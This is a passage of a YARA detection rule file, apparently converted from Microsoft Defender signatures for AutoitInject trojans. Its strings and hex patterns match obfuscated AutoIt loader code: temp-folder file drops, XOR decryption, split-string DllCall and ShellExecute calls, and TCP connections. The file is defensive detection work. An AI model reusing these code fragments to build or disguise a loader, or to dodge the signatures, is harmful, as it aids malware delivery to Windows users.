        $x_5_3 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-30] 20 00 28 00 20 00 22 00 76 00 78 00 6f 00 73 00 78 00 71 00 2e 00 2f 00 33 00 79 00 71 00 71 00 22 00 20 00 29 00 20 00 2c 00 20 00 [0-30] 20 00 28 00 20 00 22 00 7f 00 72 00 72 00 71 00 22 00 20 00 29 00}  //weight: 5, accuracy: Low
        $x_5_4 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-30] 20 28 20 22 76 78 6f 73 78 71 2e 2f 33 79 71 71 22 20 29 20 2c 20 [0-30] 20 28 20 22 7f 72 72 71 22 20 29}  //weight: 5, accuracy: Low
        $x_4_5 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-30] 20 00 28 00 20 00 22 00 68 00 6e 00 78 00 6f 00 2e 00 2f 00 33 00 79 00 71 00 71 00 22 00 20 00 29 00 20 00 2c 00 20 00 [0-30] 20 00 28 00 20 00 22 00 6d 00 69 00 6f 00 22 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_6 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-30] 20 28 20 22 68 6e 78 6f 2e 2f 33 79 71 71 22 20 29 20 2c 20 [0-30] 20 28 20 22 6d 69 6f 22 20 29}  //weight: 4, accuracy: Low
        $x_3_7 = "EXECUTE ( \"C\" & \"h\" & \"r\" & \"(\" & \"B\" & \"i\" & \"t\" & \"X\" & \"O\" & \"R\"" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_4_*) and 1 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_5_*) and 2 of ($x_4_*) and 1 of ($x_1_*))) or
            ((1 of ($x_5_*) and 2 of ($x_4_*) and 1 of ($x_3_*))) or
            ((2 of ($x_5_*) and 1 of ($x_3_*) and 1 of ($x_1_*))) or
            ((2 of ($x_5_*) and 1 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_ZHG_2147936564_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ZHG!MTB"
        threat_id = "2147936564"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "FILEINSTALL" ascii //weight: 1
        $x_1_2 = "@TEMPDIR" ascii //weight: 1
        $x_5_3 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-30] 20 00 28 00 20 00 22 00 76 00 78 00 6f 00 73 00 78 00 71 00 2e 00 2f 00 33 00 79 00 71 00 71 00 22 00 20 00 29 00 20 00 2c 00 20 00 [0-30] 20 00 28 00 20 00 22 00 7f 00 72 00 72 00 71 00 22 00 20 00 29 00}  //weight: 5, accuracy: Low
        $x_5_4 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-30] 20 28 20 22 76 78 6f 73 78 71 2e 2f 33 79 71 71 22 20 29 20 2c 20 [0-30] 20 28 20 22 7f 72 72 71 22 20 29}  //weight: 5, accuracy: Low
        $x_4_5 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-30] 20 00 28 00 20 00 22 00 68 00 6e 00 78 00 6f 00 2e 00 2f 00 33 00 79 00 71 00 71 00 22 00 20 00 29 00 20 00 2c 00 20 00 [0-30] 20 00 28 00 20 00 22 00 6d 00 69 00 6f 00 22 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_6 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-30] 20 28 20 22 68 6e 78 6f 2e 2f 33 79 71 71 22 20 29 20 2c 20 [0-30] 20 28 20 22 6d 69 6f 22 20 29}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_4_*) and 2 of ($x_1_*))) or
            ((1 of ($x_5_*) and 2 of ($x_4_*))) or
            ((2 of ($x_5_*) and 1 of ($x_1_*))) or
            ((2 of ($x_5_*) and 1 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_ZHP_2147936930_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ZHP!MTB"
        threat_id = "2147936930"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "EXECUTE ( \"B\" & \"i\" & \"n\" & \"a\" & \"r\" & \"y\" & \"L\" & \"e\" & \"n\" )" ascii //weight: 1
        $x_5_2 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-20] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-20] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 5, accuracy: Low
        $x_5_3 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-20] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-20] 22 20 2c 20 31 20 29}  //weight: 5, accuracy: Low
        $x_4_4 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 44 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 68 00 68 00 6f 00 71 00 62 00 6f 00 30 00 35 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_5 = {43 41 4c 4c 20 28 20 22 44 22 20 26 20 22 6c 22 20 26 20 22 6c 22 20 26 20 22 43 22 20 26 20 22 61 22 20 26 20 22 6c 22 20 26 20 22 6c 22 20 2c 20 [0-20] 20 28 20 22 68 68 6f 71 62 6f 30 35 22 20 2c 20 33 20 29}  //weight: 4, accuracy: Low
        $x_3_6 = "CALL ( \"D\" & \"l\" & \"l\" & \"s\" & \"t\" & \"ructS\" & \"etD\" & \"ata\"" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_4_*) and 1 of ($x_3_*) and 1 of ($x_1_*))) or
            ((1 of ($x_5_*) and 2 of ($x_4_*))) or
            ((2 of ($x_5_*) and 1 of ($x_3_*))) or
            ((2 of ($x_5_*) and 1 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NMD_2147937715_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NMD!MTB"
        threat_id = "2147937715"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "SHELLEXECUTE ( @COMSPEC , CHR ( 32 ) & CHR ( 47 ) & CHR ( 99 ) & CHR ( 32 ) & CHR ( 32 ) & CHR" ascii //weight: 2
        $x_1_2 = "= EXECUTE ( BINARYTOSTRING ( \"0x20475549476574437572736F72496E666F2829\" ) )" ascii //weight: 1
        $x_1_3 = "= REGREAD ( BINARYTOSTRING ( CHR ( 48 ) & CHR ( 120 ) & CHR ( 52 ) & CHR ( 56 ) & CHR ( 52 ) & CHR" ascii //weight: 1
        $x_1_4 = "& CHR ( BITXOR ( ASC ( STRINGMID ( $S_ENCRYPTTEXT , $I_ENCRYPTCOUNTG , 1 ) ) , ASC ( STRINGMID (" ascii //weight: 1
        $x_1_5 = "= BITXOR ( DEC ( STRINGMID ( $S_ENCRYPTTEXT , $I_ENCRYPTCOUNTA , 2 ) ) , $I_ENCRYPTCOUNTE )" ascii //weight: 1
        $x_1_6 = "= ASC ( STRINGMID ( $S_ENCRYPTPASSWORD , MOD ( $I_ENCRYPTCOUNTA , STRINGLEN (" ascii //weight: 1
        $x_1_7 = "FUNC _STRINGENCRYPT ( $I_ENCRYPT , $S_ENCRYPTTEXT , $S_ENCRYPTPASSWORD , $I_ENCRYPTLEVEL = 1 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AJ_2147939769_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AJ!MTB"
        threat_id = "2147939769"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "[ 2 ] = [ \"JcMewjJKy.exe" ascii //weight: 2
        $x_2_2 = "SHELLEXECUTE ( @WORKINGDIR &" ascii //weight: 2
        $x_1_3 = "TCPCONNECT" ascii //weight: 1
        $x_1_4 = "TCPCLOSESOCKET" ascii //weight: 1
        $x_1_5 = "DRIVEGETDRIVE" ascii //weight: 1
        $x_1_6 = "TCPSHUTDOWN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AWRA_2147939855_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AWRA!MTB"
        threat_id = "2147939855"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 22 00 20 00 26 00 20 00 22 00 72 00 28 00 42 00 69 00 74 00 22 00 20 00 26 00 20 00 22 00 58 00 4f 00 22 00 20 00 26 00 20 00 22 00 52 00 28 00 41 00 73 00 22 00 20 00 26 00 20 00 22 00 63 00 28 00 24 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00 24 00 [0-32] 2c 00 20 00 24 00 [0-32] 2c 00 20 00 31 00 29 00 29 00 2c 00 20 00 24 00 [0-32] 29 00 29 00 22 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_2 = {45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 22 20 26 20 22 72 28 42 69 74 22 20 26 20 22 58 4f 22 20 26 20 22 52 28 41 73 22 20 26 20 22 63 28 24 [0-32] 28 22 20 26 20 22 24 [0-32] 2c 20 24 [0-32] 2c 20 31 29 29 2c 20 24 [0-32] 29 29 22 20 29}  //weight: 3, accuracy: Low
        $x_2_3 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-32] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-32] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-32] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-32] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_5 = "EXECUTE ( \"S\" & \"t\" & \"r\" & \"i\" & \"n\" & \"g\" & \"L\" & \"e\" & \"n\" )" ascii //weight: 2
        $x_2_6 = "EXECUTE ( \"S\" & \"t\" & \"r\" & \"i\" & \"n\" & \"g\" & \"M\" & \"i\" & \"d\" )" ascii //weight: 2
        $x_2_7 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 46 00 69 00 6c 00 65 00 52 00 65 00 61 00 64 00 28 00 46 00 69 00 6c 00 65 00 4f 00 70 00 65 00 6e 00 28 00 40 00 54 00 65 00 6d 00 70 00 44 00 69 00 72 00 20 00 26 00 20 00 22 00 22 00 5c 00 [0-32] 22 00 22 00 29 00 29 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_8 = {45 58 45 43 55 54 45 20 28 20 22 46 69 6c 65 52 65 61 64 28 46 69 6c 65 4f 70 65 6e 28 40 54 65 6d 70 44 69 72 20 26 20 22 22 5c [0-32] 22 22 29 29 22 20 29}  //weight: 2, accuracy: Low
        $x_3_9 = {28 00 20 00 22 00 6b 00 7d 00 60 00 78 00 6b 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00 20 00 2c 00 20 00 [0-32] 20 00 28 00 20 00 22 00 3f 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00 20 00 2c 00 20 00 [0-32] 20 00 28 00 20 00 22 00 6b 00 7d 00 60 00 78 00 6b 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_10 = {28 20 22 6b 7d 60 78 6b 22 20 2c 20 22 31 35 22 20 29 20 2c 20 [0-32] 20 28 20 22 3f 22 20 2c 20 22 31 35 22 20 29 20 2c 20 [0-32] 20 28 20 22 6b 7d 60 78 6b 22 20 2c 20 22 31 35 22 20 29}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 6 of ($x_2_*))) or
            ((2 of ($x_3_*) and 4 of ($x_2_*))) or
            ((3 of ($x_3_*) and 3 of ($x_2_*))) or
            ((4 of ($x_3_*) and 1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AK_2147940149_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AK!MTB"
        threat_id = "2147940149"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FILEINSTALL ( \"Cocles\" , @TEMPDIR & \"\\Cocles\" , 1 )" ascii //weight: 1
        $x_1_2 = "REGDELETE ( \"default\" , \"pZjWU8gy\" )" ascii //weight: 1
        $x_1_3 = "HOTKEYSET ( \"default\" , \"hHcbbFPAH\" )" ascii //weight: 1
        $x_1_4 = "CONSOLEWRITE ( \"KdU5fIGyg\" )" ascii //weight: 1
        $x_1_5 = "SEND ( \"DmnvWai9ze\" , 139 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMSA_2147940429_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMSA!MTB"
        threat_id = "2147940429"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "18"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-32] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-32] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-32] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-32] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 6a 00 7b 00 6e 00 6a 00 7d 00 4c 00 7b 00 6c 00 7a 00 7d 00 7b 00 5c 00 63 00 63 00 4b 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {45 58 45 43 55 54 45 20 28 20 [0-20] 20 28 20 22 6a 7b 6e 6a 7d 4c 7b 6c 7a 7d 7b 5c 63 63 4b 22 20 2c 20 22 31 35 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_5 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 7c 00 7c 00 6a 00 7d 00 6b 00 6b 00 4e 00 63 00 63 00 6e 00 4c 00 63 00 63 00 4b 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_6 = {45 58 45 43 55 54 45 20 28 20 [0-20] 20 28 20 22 7c 7c 6a 7d 6b 6b 4e 63 63 6e 4c 63 63 4b 22 20 2c 20 22 31 35 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_7 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 7d 00 7b 00 5f 00 7b 00 6a 00 48 00 7b 00 6c 00 7a 00 7d 00 7b 00 5c 00 63 00 63 00 4b 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_8 = {45 58 45 43 55 54 45 20 28 20 [0-20] 20 28 20 22 7d 7b 5f 7b 6a 48 7b 6c 7a 7d 7b 5c 63 63 4b 22 20 2c 20 22 31 35 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_9 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 6e 00 7b 00 6e 00 4b 00 7b 00 6a 00 5c 00 7b 00 6c 00 7a 00 7d 00 7b 00 5c 00 63 00 63 00 4b 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_10 = {45 58 45 43 55 54 45 20 28 20 [0-20] 20 28 20 22 6e 7b 6e 4b 7b 6a 5c 7b 6c 7a 7d 7b 5c 63 63 4b 22 20 2c 20 22 31 35 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_11 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 63 00 63 00 6e 00 4c 00 63 00 63 00 4b 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_12 = {45 58 45 43 55 54 45 20 28 20 [0-20] 20 28 20 22 63 63 6e 4c 63 63 4b 22 20 2c 20 22 31 35 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_13 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 61 00 6a 00 43 00 76 00 7d 00 6e 00 61 00 66 00 4d 00 22 00 20 00 2c 00 20 00 22 00 31 00 35 00 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_14 = {45 58 45 43 55 54 45 20 28 20 [0-20] 20 28 20 22 61 6a 43 76 7d 6e 61 66 4d 22 20 2c 20 22 31 35 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_4_15 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 22 00 20 00 26 00 20 00 22 00 72 00 28 00 42 00 69 00 74 00 22 00 20 00 26 00 20 00 22 00 58 00 4f 00 22 00 20 00 26 00 20 00 22 00 52 00 28 00 41 00 73 00 22 00 20 00 26 00 20 00 22 00 63 00 28 00 53 00 74 00 72 00 69 00 6e 00 67 00 4d 00 69 00 64 00 28 00 22 00 20 00 26 00 20 00 22 00 24 00 [0-20] 2c 00 20 00 24 00 [0-20] 2c 00 20 00 31 00 29 00 29 00 2c 00 20 00 24 00 [0-20] 29 00 29 00 22 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_16 = {45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 22 20 26 20 22 72 28 42 69 74 22 20 26 20 22 58 4f 22 20 26 20 22 52 28 41 73 22 20 26 20 22 63 28 53 74 72 69 6e 67 4d 69 64 28 22 20 26 20 22 24 [0-20] 2c 20 24 [0-20] 2c 20 31 29 29 2c 20 24 [0-20] 29 29 22 20 29}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((9 of ($x_2_*))) or
            ((1 of ($x_4_*) and 7 of ($x_2_*))) or
            ((2 of ($x_4_*) and 5 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AOSA_2147940456_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AOSA!MTB"
        threat_id = "2147940456"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 42 00 49 00 54 00 58 00 4f 00 52 00 20 00 28 00 20 00 41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-20] 20 00 2c 00 20 00 24 00 [0-20] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {26 3d 20 43 48 52 20 28 20 42 49 54 58 4f 52 20 28 20 41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-20] 20 2c 20 24 [0-20] 20 2c 20 31 20 29 20 29 20 2c 20 24 [0-20] 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-32] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-32] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-32] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-32] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_5 = " EXECUTE ( \"DllCall\" )" ascii //weight: 2
        $x_4_6 = {44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 43 00 52 00 45 00 41 00 54 00 45 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 4a 00 51 00 5c 00 4d 00 73 00 22 00 20 00 29 00 20 00 26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-20] 20 00 29 00 20 00 26 00 20 00 [0-20] 20 00 28 00 20 00 22 00 75 00 22 00 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_7 = {44 4c 4c 53 54 52 55 43 54 43 52 45 41 54 45 20 28 20 [0-20] 20 28 20 22 4a 51 5c 4d 73 22 20 29 20 26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-20] 20 29 20 26 20 [0-20] 20 28 20 22 75 22 20 29 20 29}  //weight: 4, accuracy: Low
        $x_4_8 = {28 00 20 00 22 00 58 00 5c 00 5a 00 22 00 20 00 29 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 2b 00 20 00 39 00 31 00 38 00 34 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 58 00 5c 00 5a 00 22 00 20 00 29 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 58 00 5c 00 5a 00 22 00 20 00 29 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 58 00 5c 00 5a 00 22 00 20 00 29 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 58 00 5c 00 5a 00 22 00 20 00 29 00 20 00 2c 00 20 00 30 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_9 = {28 20 22 58 5c 5a 22 20 29 20 2c 20 24 [0-20] 20 2b 20 39 31 38 34 20 2c 20 [0-20] 20 28 20 22 58 5c 5a 22 20 29 20 2c 20 30 20 2c 20 [0-20] 20 28 20 22 58 5c 5a 22 20 29 20 2c 20 30 20 2c 20 [0-20] 20 28 20 22 58 5c 5a 22 20 29 20 2c 20 30 20 2c 20 [0-20] 20 28 20 22 58 5c 5a 22 20 29 20 2c 20 30 20 29}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 5 of ($x_2_*))) or
            ((2 of ($x_4_*) and 3 of ($x_2_*))) or
            ((3 of ($x_4_*) and 1 of ($x_2_*))) or
            ((4 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NMG_2147941625_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NMG!MTB"
        threat_id = "2147941625"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "[ ( ( ( ( 16 * 3 + -41 ) * 14 + -93 ) * 8 + -37 ) * 31 + -91 ) ]" ascii //weight: 2
        $x_1_2 = "[ ( ( 3 * 13 + -30 ) * ( 11 * 14 / 22 ) + -61 ) ]" ascii //weight: 1
        $x_1_3 = "( 20 * ( ( ( 3 * 24 + -67 ) * 8 + -37 ) * 20 + -57 ) + -57 )" ascii //weight: 1
        $x_1_4 = "( ( 14 * 8 / 8 ) , - ( ( ( 5 * 80 / 50 ) * 3 + -21 ) * 28 + -82 ) , D )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_GPXC_2147941839_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.GPXC!MTB"
        threat_id = "2147941839"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 5, accuracy: Low
        $x_5_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 5, accuracy: Low
        $x_3_3 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 46 00 69 00 6c 00 65 00 22 00 20 00 26 00 20 00 22 00 52 00 65 00 61 00 64 00 22 00 20 00 2c 00 20 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 46 00 69 00 6c 00 65 00 4f 00 22 00 20 00 26 00 20 00 22 00 70 00 65 00 6e 00 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-47] 22 00 20 00 29 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_4 = {43 41 4c 4c 20 28 20 22 46 69 6c 65 22 20 26 20 22 52 65 61 64 22 20 2c 20 43 41 4c 4c 20 28 20 22 46 69 6c 65 4f 22 20 26 20 22 70 65 6e 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-47] 22 20 29 20 29}  //weight: 3, accuracy: Low
        $x_2_5 = {44 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 43 00 61 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 [0-47] 20 00 28 00 20 00 22 00}  //weight: 2, accuracy: Low
